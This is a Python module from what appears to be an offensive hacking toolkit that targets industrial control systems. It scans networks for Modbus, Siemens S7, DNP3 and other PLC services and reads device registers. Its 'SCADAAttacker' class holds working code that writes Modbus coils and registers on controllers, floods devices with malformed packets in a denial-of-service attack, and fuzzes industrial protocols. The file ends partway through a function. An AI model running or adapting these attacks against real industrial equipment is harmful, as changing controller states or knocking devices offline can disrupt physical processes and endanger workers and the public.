#!/usr/bin/env python3
"""
SCADA/ICS Security Testing Module
Professional industrial control systems security assessment and testing

Author: N3twork(GHANA) - Computer Programmer & Hacker
Version: 1.0
"""

import sys
import os
import time
import socket
import struct
import threading
import subprocess
from typing import List, Dict, Optional, Any, Tuple
import json
import binascii
import random

# Import application dependencies
sys.path.append(os.path.dirname(os.path.dirname(__file__)))
from config import Config, Colors
from utils import (
    SystemUtils, MenuRenderer, Logger, InputValidator, 
    Animation, error_handler
)

class IndustrialDevice:
    """Represents a discovered industrial device"""
    
    def __init__(self, ip: str, port: int = 502, protocol: str = "Unknown"):
        self.ip = ip
        self.port = port
        self.protocol = protocol
        self.device_type = "Unknown"
        self.manufacturer = "Unknown"
        self.firmware_version = "Unknown"
        self.model = "Unknown"
        self.services = []
        self.vulnerabilities = []
        self.registers = {}
        self.coils = {}
        self.device_info = {}
        
    def __str__(self):
        return f"{self.ip}:{self.port} ({self.protocol}) - {self.device_type}"

class ModbusScanner:
    """Modbus protocol scanner and analyzer"""
    
    def __init__(self):
        self.logger = Logger.get_logger("modbus_scanner")
    
    def scan_modbus_devices(self, ip_range: str, port: int = 502) -> List[IndustrialDevice]:
        """Scan for Modbus devices"""
        print(f"\n{Colors.CYAN}  [{Colors.GREEN}+{Colors.CYAN}] Modbus Device Discovery")
        print(f"{Colors.INFO}  Scanning {ip_range}:{port}")
        
        devices = []
        
        try:
            # Parse IP range
            if "/" in ip_range:
                # CIDR notation
                import ipaddress
                network = ipaddress.ip_network(ip_range, strict=False)
                ip_list = [str(ip) for ip in network.hosts()][:254]  # Limit scan
            elif "-" in ip_range:
                # Range notation (e.g., 192.168.1.1-254)
                base_ip, range_part = ip_range.rsplit('.', 1)
                start, end = range_part.split('-')
                ip_list = [f"{base_ip}.{i}" for i in range(int(start), min(int(end) + 1, 255))]
            else:
                # Single IP
                ip_list = [ip_range]
            
            print(f"{Colors.INFO}  Scanning {len(ip_list)} IP addresses...")
            
            for i, ip in enumerate(ip_list):
                if i % 50 == 0:
                    progress = (i / len(ip_list)) * 100
                    print(f"{Colors.YELLOW}  Progress: {progress:.1f}% ({i}/{len(ip_list)})")
                
                if self._test_modbus_connection(ip, port):
                    device = IndustrialDevice(ip, port, "Modbus")
                    
                    # Get device information
                    device_info = self._get_modbus_device_info(ip, port)
                    device.device_info = device_info
                    device.device_type = device_info.get('device_type', 'Modbus Device')
                    device.manufacturer = device_info.get('manufacturer', 'Unknown')
                    
                    devices.append(device)
                    print(f"{Colors.GREEN}    • Found Modbus device: {ip}:{port}")
                    
        except Exception as e:
            self.logger.error(f"Modbus scan error: {e}")
            print(f"{Colors.ERROR}  Scan error: {e}")
        
        print(f"\n{Colors.SUCCESS}  Found {len(devices)} Modbus devices")
        return devices
    
    def _test_modbus_connection(self, ip: str, port: int, timeout: float = 2.0) -> bool:
        """Test if a Modbus service is running"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((ip, port))
            
            if result == 0:
                # Send Modbus device identification request
                modbus_request = self._build_modbus_request(1, 0x2B, 0x0E, 0x01, 0x00)
                sock.send(modbus_request)
                
                response = sock.recv(1024)
                sock.close()
                
                # Check if response looks like Modbus
                if len(response) > 6 and response[2:4] == b'\x00\x00':
                    return True
            else:
                sock.close()
        except:
            pass
        
        return False
    
    def _build_modbus_request(self, unit_id: int, function_code: int, *args) -> bytes:
        """Build a Modbus TCP request"""
        transaction_id = random.randint(1, 65535)
        protocol_id = 0
        
        # Build PDU (Protocol Data Unit)
        pdu = struct.pack('B', function_code)
        for arg in args:
            if isinstance(arg, int):
                if arg <= 0xFF:
                    pdu += struct.pack('B', arg)
                else:
                    pdu += struct.pack('>H', arg)
            else:
                pdu += arg
        
        length = len(pdu) + 1  # PDU + unit_id
        
        # Build MBAP header (Modbus Application Protocol)
        mbap_header = struct.pack('>HHHB', transaction_id, protocol_id, length, unit_id)
        
        return mbap_header + pdu
    
    def _get_modbus_device_info(self, ip: str, port: int) -> Dict[str, Any]:
        """Get detailed Modbus device information"""
        info = {
            'ip': ip,
            'port': port,
            'device_type': 'Modbus Device',
            'manufacturer': 'Unknown',
            'firmware_version': 'Unknown',
            'supported_functions': []
        }
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5.0)
            sock.connect((ip, port))
            
            # Try device identification (function code 43/14)
            request = self._build_modbus_request(1, 0x2B, 0x0E, 0x01, 0x00)
            sock.send(request)
            response = sock.recv(1024)
            
            if len(response) > 9:
                # Parse device identification response
                if response[7] == 0x2B and response[8] == 0x0E:
                    try:
                        data_start = 12
                        while data_start < len(response):
                            obj_id = response[data_start]
                            obj_len = response[data_start + 1]
                            obj_data = response[data_start + 2:data_start + 2 + obj_len]
                            
                            if obj_id == 0x00:  # Vendor name
                                info['manufacturer'] = obj_data.decode('ascii', errors='ignore')
                            elif obj_id == 0x01:  # Product code
                                info['device_type'] = obj_data.decode('ascii', errors='ignore')
                            elif obj_id == 0x02:  # Major/Minor version
                                info['firmware_version'] = obj_data.decode('ascii', errors='ignore')
                            
                            data_start += 2 + obj_len
                    except:
                        pass
            
            # Test common function codes
            function_codes = [1, 2, 3, 4, 5, 6, 15, 16]
            for fc in function_codes:
                try:
                    if fc in [1, 2]:  # Read coils/discrete inputs
                        request = self._build_modbus_request(1, fc, 0, 1)
                    elif fc in [3, 4]:  # Read holding/input registers
                        request = self._build_modbus_request(1, fc, 0, 1)
                    else:
                        continue
                    
                    sock.send(request)
                    response = sock.recv(1024)
                    
                    if len(response) > 8 and response[7] == fc:
                        info['supported_functions'].append(fc)
                        
                except:
                    continue
            
            sock.close()
            
        except Exception as e:
            self.logger.debug(f"Device info error for {ip}: {e}")
        
        return info
    
    def read_modbus_registers(self, ip: str, port: int, start_addr: int = 0, count: int = 10) -> Dict[int, int]:
        """Read Modbus holding registers"""
        print(f"\n{Colors.CYAN}  [{Colors.GREEN}+{Colors.CYAN}] Reading Modbus Registers")
        print(f"{Colors.INFO}  Device: {ip}:{port}")
        print(f"{Colors.INFO}  Start address: {start_addr}, Count: {count}")
        
        registers = {}
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5.0)
            sock.connect((ip, port))
            
            # Read holding registers (function code 3)
            request = self._build_modbus_request(1, 3, start_addr, count)
            sock.send(request)
            response = sock.recv(1024)
            
            if len(response) > 9 and response[7] == 3:
                byte_count = response[8]
                register_data = response[9:9 + byte_count]
                
                for i in range(0, len(register_data), 2):
                    if i + 1 < len(register_data):
                        reg_addr = start_addr + (i // 2)
                        reg_value = struct.unpack('>H', register_data[i:i+2])[0]
                        registers[reg_addr] = reg_value
                        print(f"{Colors.GREEN}    Register {reg_addr}: {reg_value}")
            
            sock.close()
            
        except Exception as e:
            self.logger.error(f"Register read error: {e}")
            print(f"{Colors.ERROR}  Failed to read registers: {e}")
        
        return registers

class PLCScanner:
    """Generic PLC protocol scanner"""
    
    def __init__(self):
        self.logger = Logger.get_logger("plc_scanner")
        
        # Common industrial ports
        self.common_ports = {
            102: "S7comm (Siemens)",
            44818: "EtherNet/IP (Allen-Bradley)",
            502: "Modbus TCP",
            20000: "DNP3",
            2404: "IEC 61850 MMS",
            9600: "OMRON FINS",
            1962: "PCWorx (Phoenix Contact)",
            5007: "Mitsubishi MELSEC"
        }
    
    def scan_industrial_devices(self, ip_range: str) -> List[IndustrialDevice]:
        """Scan for various industrial devices"""
        print(f"\n{Colors.CYAN}  [{Colors.GREEN}+{Colors.CYAN}] Industrial Device Discovery")
        print(f"{Colors.INFO}  Scanning {ip_range} for industrial protocols")
        
        devices = []
        
        try:
            # Parse IP range (simplified)
            if "/" in ip_range:
                import ipaddress
                network = ipaddress.ip_network(ip_range, strict=False)
                ip_list = [str(ip) for ip in list(network.hosts())[:100]]  # Limit scan
            else:
                ip_list = [ip_range]
            
            for ip in ip_list:
                print(f"{Colors.BLUE}  Scanning {ip}...")
                
                for port, protocol in self.common_ports.items():
                    if self._test_port_connection(ip, port):
                        device = IndustrialDevice(ip, port, protocol)
                        device.device_type = self._identify_device_type(ip, port, protocol)
                        devices.append(device)
                        print(f"{Colors.GREEN}    • Found {protocol} device: {ip}:{port}")
                        
        except Exception as e:
            self.logger.error(f"Industrial scan error: {e}")
            print(f"{Colors.ERROR}  Scan error: {e}")
        
        print(f"\n{Colors.SUCCESS}  Found {len(devices)} industrial devices")
        return devices
    
    def _test_port_connection(self, ip: str, port: int, timeout: float = 2.0) -> bool:
        """Test if a port is open"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((ip, port))
            sock.close()
            return result == 0
        except:
            return False
    
    def _identify_device_type(self, ip: str, port: int, protocol: str) -> str:
        """Try to identify the specific device type"""
        if "Siemens" in protocol:
            return "Siemens PLC"
        elif "Allen-Bradley" in protocol:
            return "Allen-Bradley PLC"
        elif "Modbus" in protocol:
            return "Modbus Device"
        elif "DNP3" in protocol:
            return "DNP3 Device"
        else:
            return "Industrial Device"

class SCADAAttacker:
    """SCADA/ICS attack tools"""
    
    def __init__(self):
        self.logger = Logger.get_logger("scada_attacker")
    
    def modbus_coil_manipulation(self, ip: str, port: int, coil_addr: int, value: bool) -> bool:
        """Manipulate Modbus coil (write single coil)"""
        print(f"\n{Colors.CYAN}  [{Colors.RED}⚠{Colors.CYAN}] Modbus Coil Manipulation")
        print(f"{Colors.WARNING}  Target: {ip}:{port}")
        print(f"{Colors.WARNING}  Coil address: {coil_addr}")
        print(f"{Colors.WARNING}  New value: {value}")
        print(f"{Colors.ERROR}  ⚠️  This may affect industrial processes!")
        
        confirm = input(f"\n{Colors.GREEN}  Continue with coil manipulation? ({Colors.CYAN}y{Colors.GREEN}/{Colors.RED}N{Colors.GREEN}): {Colors.YELLOW}").strip().lower()
        if confirm not in ['y', 'yes']:
            print(f"{Colors.INFO}  Attack cancelled")
            return False
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5.0)
            sock.connect((ip, port))
            
            # Write single coil (function code 5)
            coil_value = 0xFF00 if value else 0x0000
            request = self._build_modbus_request(1, 5, coil_addr, coil_value)
            sock.send(request)
            
            response = sock.recv(1024)
            sock.close()
            
            if len(response) > 7 and response[7] == 5:
                print(f"{Colors.SUCCESS}  Coil manipulation successful")
                return True
            else:
                print(f"{Colors.ERROR}  Coil manipulation failed")
                return False
                
        except Exception as e:
            self.logger.error(f"Coil manipulation error: {e}")
            print(f"{Colors.ERROR}  Attack error: {e}")
            return False
    
    def modbus_register_write(self, ip: str, port: int, reg_addr: int, value: int) -> bool:
        """Write to Modbus holding register"""
        print(f"\n{Colors.CYAN}  [{Colors.RED}⚠{Colors.CYAN}] Modbus Register Write")
        print(f"{Colors.WARNING}  Target: {ip}:{port}")
        print(f"{Colors.WARNING}  Register address: {reg_addr}")
        print(f"{Colors.WARNING}  New value: {value}")
        print(f"{Colors.ERROR}  ⚠️  This may affect industrial processes!")
        
        confirm = input(f"\n{Colors.GREEN}  Continue with register write? ({Colors.CYAN}y{Colors.GREEN}/{Colors.RED}N{Colors.GREEN}): {Colors.YELLOW}").strip().lower()
        if confirm not in ['y', 'yes']:
            print(f"{Colors.INFO}  Attack cancelled")
            return False
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5.0)
            sock.connect((ip, port))
            
            # Write single register (function code 6)
            request = self._build_modbus_request(1, 6, reg_addr, value)
            sock.send(request)
            
            response = sock.recv(1024)
            sock.close()
            
            if len(response) > 7 and response[7] == 6:
                print(f"{Colors.SUCCESS}  Register write successful")
                return True
            else:
                print(f"{Colors.ERROR}  Register write failed")
                return False
                
        except Exception as e:
            self.logger.error(f"Register write error: {e}")
            print(f"{Colors.ERROR}  Attack error: {e}")
            return False
    
    def dos_attack(self, ip: str, port: int, duration: int = 30) -> bool:
        """Perform DoS attack on industrial device"""
        print(f"\n{Colors.CYAN}  [{Colors.RED}⚠{Colors.CYAN}] Industrial Device DoS Attack")
        print(f"{Colors.WARNING}  Target: {ip}:{port}")
        print(f"{Colors.WARNING}  Duration: {duration} seconds")
        print(f"{Colors.ERROR}  ⚠️  This may disrupt industrial operations!")
        
        confirm = input(f"\n{Colors.GREEN}  Continue with DoS attack? ({Colors.CYAN}y{Colors.GREEN}/{Colors.RED}N{Colors.GREEN}): {Colors.YELLOW}").strip().lower()
        if confirm not in ['y', 'yes']:
            print(f"{Colors.INFO}  Attack cancelled")
            return False
        
        try:
            print(f"\n{Colors.BLUE}  Starting DoS attack...")
            
            start_time = time.time()
            connections = []
            packets_sent = 0
            
            while (time.time() - start_time) < duration:
                try:
                    # Connection exhaustion attack
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.1)
                    sock.connect((ip, port))
                    connections.append(sock)
                    
                    # Send malformed packets
                    malformed_packet = b'\x00\x01' + b'\xFF' * 100
                    sock.send(malformed_packet)
                    packets_sent += 1
                    
                    if packets_sent % 100 == 0:
                        elapsed = time.time() - start_time
                        print(f"{Colors.YELLOW}    Attack progress... {elapsed:.0f}s, {packets_sent} packets sent")
                    
                except:
                    continue
            
            # Close connections
            for sock in connections:
                try:
                    sock.close()
                except:
                    pass
            
            print(f"{Colors.SUCCESS}  DoS attack completed: {packets_sent} packets sent")
            return True
            
        except Exception as e:
            self.logger.error(f"DoS attack error: {e}")
            print(f"{Colors.ERROR}  Attack error: {e}")
            return False
    
    def protocol_fuzzer(self, ip: str, port: int, protocol: str, count: int = 100) -> Dict[str, Any]:
        """Fuzz industrial protocol"""
        print(f"\n{Colors.CYAN}  [{Colors.RED}⚠{Colors.CYAN}] Protocol Fuzzing Attack")
        print(f"{Colors.WARNING}  Target: {ip}:{port} ({protocol})")
        print(f"{Colors.WARNING}  Test cases: {count}")
        print(f"{Colors.ERROR}  ⚠️  Fuzzing may cause device instability!")
        
        results = {
            'total_tests': count,
            'successful_sends': 0,
            'responses_received': 0,
            'anomalies_detected': 0,
            'crashes_detected': 0
        }
        
        confirm = input(f"\n{Colors.GREEN}  Continue with protocol fuzzing? ({Colors.CYAN}y{Colors.GREEN}/{Colors.RED}N{Colors.GREEN}): {Colors.YELLOW}").strip().lower()
        if confirm not in ['y', 'yes']:
            print(f"{Colors.INFO}  Fuzzing cancelled")
            return results
        
        try:
            print(f"\n{Colors.BLUE}  Starting protocol fuzzing...")
            
            for i in range(count):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2.0)
                    sock.connect((ip, port))
                    
                    # Generate fuzz data based on protocol
                    if "Modbus" in protocol:
                        fuzz_data = self._generate_modbus_fuzz_data()
                    elif "S7comm" in protocol:
                        fuzz_data = self._generate_s7_fuzz_data()
                    else:
                        fuzz_data = self._generate_generic_fuzz_data()
                    
                    sock.send(fuzz_data)
                    results['successful_sends'] += 1
                    
                    # Try to receive response
                    try:
                        response = sock.recv(1024)
                        if response:
                            results['responses_received'] += 1
                            
                            # Check for anomalies
                            if len(response) < 2 or b'\x00\x00\x00\x00' in response:
                                results['anomalies_detected'] += 1
                    except:
                        pass
                    
                    sock.close()
                    
                    if i % 20 == 0:
                        progress = (i / count) * 100
                        print(f"{Colors.YELLOW}    Fuzzing progress: {progress:.1f}% ({i}/{count})")
                    
                except socket.error:
                    results['crashes_detected'] += 1
                except Exception as e:
                    self.logger.debug(f"Fuzz test {i} error: {e}")
                
                time.sleep(0.01)  # Small delay
            
            print(f"\n{Colors.SUCCESS}  Fuzzing completed")
            print(f"{Colors.INFO}    Tests sent: {results['successful_sends']}/{results['total_tests']}")
            print(f"{Colors.INFO}    Responses: {results['responses_received']}")
            print(f"{Colors.INFO}    Anomalies: {results['anomalies_detected']}")
            print(f"{Colors.INFO}    Crashes: {results['crashes_detected']}")
            
        except Exception as e:
            self.logger.error(f"Fuzzing error: {e}")
            print(f"{Colors.ERROR}  Fuzzing error: {e}")
        
        return results
    
    def _build_modbus_request(self, unit_id: int, function_code: int, *args) -> bytes:
        """Build a Modbus TCP request"""
        transaction_id = random.randint(1, 65535)
        protocol_id = 0
        
        # Build PDU
        pdu = struct.pack('B', function_code)
        for arg in args:
            if isinstance(arg, int):
                if arg <= 0xFF:
                    pdu += struct.pack('B', arg)
                else:
                    pdu += struct.pack('>H', arg)
            else:
                pdu += arg
        
        length = len(pdu) + 1
        mbap_header = struct.pack('>HHHB', transaction_id, protocol_id, length, unit_id)
        
        return mbap_header + pdu
    
    def _generate_modbus_fuzz_data(self) -> bytes:
        """Generate fuzzing data for Modbus protocol"""
        # Random MBAP header
        transaction_id = random.randint(0, 65535)
        protocol_id = random.randint(0, 255)
        length = random.randint(1, 255)
        unit_id = random.randint(0, 255)
        
        header = struct.pack('>HHHB', transaction_id, protocol_id, length, unit_id)
        
        # Random PDU
        function_code = random.randint(0, 255)
        data_length = random.randint(0, 50)
        data = bytes([random.randint(0, 255) for _ in range(data_length)])
        
        return header + struct.pack('B', function_code) + data
    
    def _generate_s7_fuzz_data(self) -> bytes:
        """Generate fuzzing data for S7comm protocol"""
        # S7comm header structure (simplified)
        version = random.randint(0, 255)
        msg_type = random.randint(0, 255)
        reserved = 0
        pdu_ref = random.randint(0, 65535)
        param_length = random.randint(0, 255)
        data_length = random.randint(0, 255)
        
        header = struct.pack('>BBHHBB', version, msg_type, reserved, pdu_ref, param_length, data_length)
        
        # Random parameters and data
        params = bytes([random.randint(0, 255) for _ in range(min(param_length, 50))])
        data = bytes([random.randint(0, 255) for _ in range(min(data_length, 50))])
        
        return header + params + data
    
    def _generate_generic_fuzz_data(self) -> bytes:
        """Generate generic fuzzing data"""
        length = random.randint(1, 100)
        return bytes([random.randint(0, 255) for _ in range(length)])

class SCADAModule:
    """Main SCADA/ICS security testing module"""
    
    def __init__(self):
        self.logger = Logger.get_logger("scada_module")
        self.hostname = SystemUtils.get_hostname()
        self.modbus_scanner = ModbusScanner()
        self.plc_scanner = PLCScanner()
        self.attacker = SCADAAttacker()
        self.discovered_devices = []
    
    def show_menu(self):
        """Display the SCADA module menu"""
        Animation.display_banner()
        MenuRenderer.render_menu_header(f"XHARVESTER {Colors.YELLOW}-{Colors.CYAN} SCADA/ICS MODULE")
        
        icons = {
            "1": "🏗",
            "2": "🔍",
            "3": "📊",
            "4": "⚠️",
            "5": "📝",
            "6": "💥",
            "7": "🧪",
            "8": "🛑️",
            "9": "📄",
            "10": "ℹ️",
            "0": "🚚"
        }
        
        menu_options = {
            "1": " Industrial Device Discovery",
            "2": "Modbus Device Enumeration",
            "3": "Register/Coil Reading",
            "4": " Coil Manipulation Attack",
            "5": "Register Write Attack",
            "6": "Industrial DoS Attack",
            "7": "Protocol Fuzzing",
            "8": "Vulnerability Assessment",
            "9": "Generate SCADA Security Report",
            "10": "Module Information",
            "0": "Return to Main Menu"
        }
        
        MenuRenderer.render_menu_options(menu_options, icons)
        MenuRenderer.render_menu_footer()
    
    def device_discovery(self):
        """Industrial device discovery interface"""
        print(f"\n{Colors.CYAN}  [{Colors.GREEN}+{Colors.CYAN}] Industrial Device Discovery")
        
        try:
            ip_range = input(f"{Colors.GREEN}  IP range (CIDR or range) [192.168.1.0/24]: {Colors.YELLOW}") or "192.168.1.0/24"
            
            print(f"\n{Colors.INFO}  Starting comprehensive industrial device scan...")
            
            # Scan for various industrial devices
            all_devices = self.plc_scanner.scan_industrial_devices(ip_range)
            
            # Additional Modbus-specific scan
            modbus_devices = self.modbus_scanner.scan_modbus_devices(ip_range)
            
            # Combine results
            device_dict = {f"{d.ip}:{d.port}": d for d in all_devices}
            for device in modbus_devices:
                key = f"{device.ip}:{device.port}"
                if key in device_dict:
                    # Merge information
                    device_dict[key].device_info.update(device.device_info)
                else:
                    device_dict[key] = device
            
            self.discovered_devices = list(device_dict.values())
            
            if self.discovered_devices:
                print(f"\n{Colors.MAGENTA}  Discovered Industrial Devices:")
                print(f"{Colors.CYAN}  {'IP Address':<15} {'Port':<6} {'Protocol':<20} {'Device Type':<25}")
                print(f"{Colors.CYAN}  {'-'*15} {'-'*6} {'-'*20} {'-'*25}")
                
                for device in self.discovered_devices:
                    print(f"{Colors.GREEN}  {device.ip:<15} {device.port:<6} {device.protocol:<20} {device.device_type:<25}")
                    
                    if device.manufacturer != "Unknown":
                        print(f"{Colors.INFO}      Manufacturer: {device.manufacturer}")
                    if device.firmware_version != "Unknown":
                        print(f"{Colors.INFO}      Firmware: {device.firmware_version}")
            else:
                print(f"{Colors.WARNING}  No industrial devices found in the specified range")
        
        except ValueError as e:
            print(f"{Colors.ERROR}  Invalid input: {e}")
    
    def modbus_enumeration(self):
        """Modbus device enumeration interface"""
        modbus_devices = [d for d in self.discovered_devices if "Modbus" in d.protocol]
        
        if not modbus_devices:
            print(f"{Colors.WARNING}  No Modbus devices found. Run device discovery first.")
            return
        
        print(f"\n{Colors.CYAN}  [{Colors.GREEN}+{Colors.CYAN}] Modbus Device Enumeration")
        print(f"\n{Colors.INFO}  Available Modbus devices:")
        
        for i, device in enumerate(modbus_devices, 1):
            print(f"{Colors.GREEN}    [{i}] {device.ip}:{device.port} - {device.device_type}")
        
        try:
            choice_input = input(f"\n{Colors.GREEN}  Select device [1]: {Colors.YELLOW}") or "1"
            choice = InputValidator.validate_integer(choice_input, 1, len(modbus_devices))
            
            selected_device = modbus_devices[choice - 1]
            
            print(f"\n{Colors.MAGENTA}  Detailed Modbus Enumeration:")
            print(f"{Colors.INFO}  Device: {selected_device.ip}:{selected_device.port}")
            
            # Display device information
            info = selected_device.device_info
            if info:
                print(f"{Colors.CYAN}    Manufacturer: {info.get('manufacturer', 'Unknown')}")
                print(f"{Colors.CYAN}    Device Type: {info.get('device_type', 'Unknown')}")
                print(f"{Colors.CYAN}    Firmware: {info.get('firmware_version', 'Unknown')}")
                
                if 'supported_functions' in info:
                    print(f"{Colors.CYAN}    Supported Functions: {info['supported_functions']}")
            
            # Test connectivity and basic operations
            print(f"\n{Colors.BLUE}  Testing basic Modbus operations...")
            
            registers = self.modbus_scanner.read_modbus_registers(
                selected_device.ip, selected_device.port, 0, 5
            )
            
            if registers:
                selected_device.registers = registers
                print(f"{Colors.SUCCESS}  Successfully read {len(registers)} registers")
            else:
                print(f"{Colors.WARNING}  Could not read registers")
        
        except ValueError as e:
            print(f"{Colors.ERROR}  Invalid selection: {e}")
    
    def register_reading(self):
        """Register and coil reading interface"""
        modbus_devices = [d for d in self.discovered_devices if "Modbus" in d.protocol]
        
        if not modbus_devices:
            print(f"{Colors.WARNING}  No Modbus devices available.")
            return
        
        print(f"\n{Colors.CYAN}  [{Colors.GREEN}+{Colors.CYAN}] Modbus Register/Coil Reading")
        
        # Select device
        print(f"\n{Colors.INFO}  Available devices:")
        for i, device in enumerate(modbus_devices, 1):
            print(f"{Colors.GREEN}    [{i}] {device.ip}:{device.port}")
        
        try:
            device_choice = input(f"\n{Colors.GREEN}  Select device [1]: {Colors.YELLOW}") or "1"
            device_idx = InputValidator.validate_integer(device_choice, 1, len(modbus_devices))
            selected_device = modbus_devices[device_idx - 1]
            
            start_addr = input(f"{Colors.GREEN}  Start address [0]: {Colors.YELLOW}") or "0"
            start_addr = InputValidator.validate_integer(start_addr, 0, 65535)
            
            count = input(f"{Colors.GREEN}  Number of registers [10]: {Colors.YELLOW}") or "10"
            count = InputValidator.validate_integer(count, 1, 100)
            
            # Read registers
            registers = self.modbus_scanner.read_modbus_registers(
                selected_device.ip, selected_device.port, start_addr, count
            )
            
            if registers:
                print(f"\n{Colors.SUCCESS}  Successfully read {len(registers)} registers:")
                for addr, value in registers.items():
                    print(f"{Colors.CYAN}    Register {addr}: {value} (0x{value:04X})")
                    
                    # Try to interpret common register values
                    if 0 <= value <= 100:
                        print(f"{Colors.INFO}      Possible percentage: {value}%")
                    elif 1000 <= value <= 9999:
                        print(f"{Colors.INFO}      Possible temperature: {value/100:.1f}°C")
                
                # Store in device
                selected_device.registers.update(registers)
        
        except ValueError as e:
            print(f"{Colors.ERROR}  Invalid input: {e}")
    
    def coil_manipulation(self):
        """Coil manipulation attack interface"""
        modbus_devices = [d for d in self.discovered_devices if "Modbus" in d.protocol]
        
        if not modbus_devices:
            print(f"{Colors.WARNING}  No Modbus devices available.")
            return
        
        print(f"\n{Colors.CYAN}  [{Colors.RED}⚠{Colors.CYAN}] Modbus Coil Manipulation Attack")
        print(f"{Colors.ERROR}  ⚠️  WARNING: This may affect industrial processes!")
        
        # Select device
        print(f"\n{Colors.INFO}  Available devices:")
        for i, device in enumerate(modbus_devices, 1):
            print(f"{Colors.GREEN}    [{i}] {device.ip}:{device.port}")
        
        try:
            device_choice = input(f"\n{Colors.GREEN}  Select device [1]: {Colors.YELLOW}") or "1"
            device_idx = InputValidator.validate_integer(device_choice, 1, len(modbus_devices))
            selected_device = modbus_devices[device_idx - 1]
            
            coil_addr = input(f"{Colors.GREEN}  Coil address: {Colors.YELLOW}").strip()
            coil_addr = InputValidator.validate_integer(coil_addr, 0, 65535)
            
            value_input = input(f"{Colors.GREEN}  Set coil value (true/false): {Colors.YELLOW}").strip().lower()
            coil_value = value_input in ['true', '1', 'on', 'yes']
            
            # Perform attack
            success = self.attacker.modbus_coil_manipulation(
                selected_device.ip, selected_device.port, coil_addr, coil_value
            )
            
            if success:
                print(f"\n{Colors.SUCCESS}  Coil manipulation completed successfully")
            else:
                print(f"\n{Colors.ERROR}  Coil manipulation failed")
        
        except ValueError as e:
            print(f"{Colors.ERROR}  Invalid input: {e}")
    
    def register_write(self):
        """Register write attack interface"""
        modbus_devices = [d for d in self.discovered_devices if "Modbus" in d.protocol]
        
        if not modbus_devices:
            print(f"{Colors.WARNING}  No Modbus devices available.")
            return
        
        print(f"\n{Colors.CYAN}  [{Colors.RED}⚠{Colors.CYAN}] Modbus Register Write Attack")
        print(f"{Colors.ERROR}  ⚠️  WARNING: This may affect industrial processes!")
        
        # Select device
        print(f"\n{Colors.INFO}  Available devices:")
        for i, device in enumerate(modbus_devices, 1):
            print(f"{Colors.GREEN}    [{i}] {device.ip}:{device.port}")
        
        try:
            device_choice = input(f"\n{Colors.GREEN}  Select device [1]: {Colors.YELLOW}") or "1"
            device_idx = InputValidator.validate_integer(device_choice, 1, len(modbus_devices))
            selected_device = modbus_devices[device_idx - 1]
            
            reg_addr = input(f"{Colors.GREEN}  Register address: {Colors.YELLOW}").strip()
            reg_addr = InputValidator.validate_integer(reg_addr, 0, 65535)
            
            value = input(f"{Colors.GREEN}  Register value (0-65535): {Colors.YELLOW}").strip()
            reg_value = InputValidator.validate_integer(value, 0, 65535)
            
            # Perform attack
            success = self.attacker.modbus_register_write(
                selected_device.ip, selected_device.port, reg_addr, reg_value
            )
            
            if success:
                print(f"\n{Colors.SUCCESS}  Register write completed successfully")
            else:
                print(f"\n{Colors.ERROR}  Register write failed")
        
        except ValueError as e:
            print(f"{Colors.ERROR}  Invalid input: {e}")
    
    def dos_attack(self):
        """DoS attack interface"""
        if not self.discovered_devices:
            print(f"{Colors.WARNING}  No devices available. Run device discovery first.")
            return
        
        print(f"\n{Colors.CYAN}  [{Colors.RED}⚠{Colors.CYAN}] Industrial Device DoS Attack")
        print(f"{Colors.ERROR}  ⚠️  WARNING: This may disrupt industrial operations!")
        
        # Select device
        print(f"\n{Colors.INFO}  Available devices:")
        for i, device in enumerate(self.discovered_devices, 1):
            print(f"{Colors.GREEN}    [{i}] {device.ip}:{device.port} - {device.protocol}")
        
        try:
            device_choice = input(f"\n{Colors.GREEN}  Select device [1]: {Colors.YELLOW}") or "1"
            device_idx = InputValidator.validate_integer(device_choice, 1, len(self.discovered_devices))
            selected_device = self.discovered_devices[device_idx - 1]
            
            duration = input(f"{Colors.GREEN}  Attack duration (seconds) [10]: {Colors.YELLOW}") or "10"
            duration = InputValidator.validate_integer(duration, 1, 300)
            
            # Perform DoS attack
            success = self.attacker.dos_attack(selected_device.ip, selected_device.port, duration)
            
            if success:
                print(f"\n{Colors.SUCCESS}  DoS attack completed")
            else:
                print(f"\n{Colors.ERROR}  DoS attack failed")
        
        except ValueError as e:
            print(f"{Colors.ERROR}  Invalid input: {e}")
    
    def protocol_fuzzing(self):
        """Protocol fuzzing interface"""
        if not self.discovered_devices:
            print(f"{Colors.WARNING}  No devices available. Run device discovery first.")
            return
        
        print(f"\n{Colors.CYAN}  [{Colors.RED}⚠{Colors.CYAN}] Industrial Protocol Fuzzing")
        print(f"{Colors.ERROR}  ⚠️  WARNING: Fuzzing may cause device instability!")
        
        # Select device
        print(f"\n{Colors.INFO}  Available devices:")
        for i, device in enumerate(self.discovered_devices, 1):
            print(f"{Colors.GREEN}    [{i}] {device.ip}:{device.port} - {device.protocol}")
        
        try:
            device_choice = input(f"\n{Colors.GREEN}  Select device [1]: {Colors.YELLOW}") or "1"
            device_idx = InputValidator.validate_integer(device_choice, 1, len(self.discovered_devices))
            selected_device = self.discovered_devices[device_idx - 1]
            
            test_count = input(f"{Colors.GREEN}  Number of test cases [50]: {Colors.YELLOW}") or "50"
            test_count = InputValidator.validate_integer(test_count, 1, 1000)
            
            # Perform fuzzing
            results = self.attacker.protocol_fuzzer(
                selected_device.ip, selected_device.port, selected_device.protocol, test_count
            )
            
            # Analyze results
            print(f"\n{Colors.MAGENTA}  Fuzzing Results Analysis:")
            success_rate = (results['successful_sends'] / results['total_tests']) * 100
            response_rate = (results['responses_received'] / results['successful_sends']) * 100 if results['successful_sends'] > 0 else 0
            
            print(f"{Colors.INFO}    Success rate: {success_rate:.1f}%")
            print(f"{Colors.INFO}    Response rate: {response_rate:.1f}%")
            print(f"{Colors.INFO}    Anomaly rate: {(results['anomalies_detected'] / results['total_tests']) * 100:.1f}%")
            
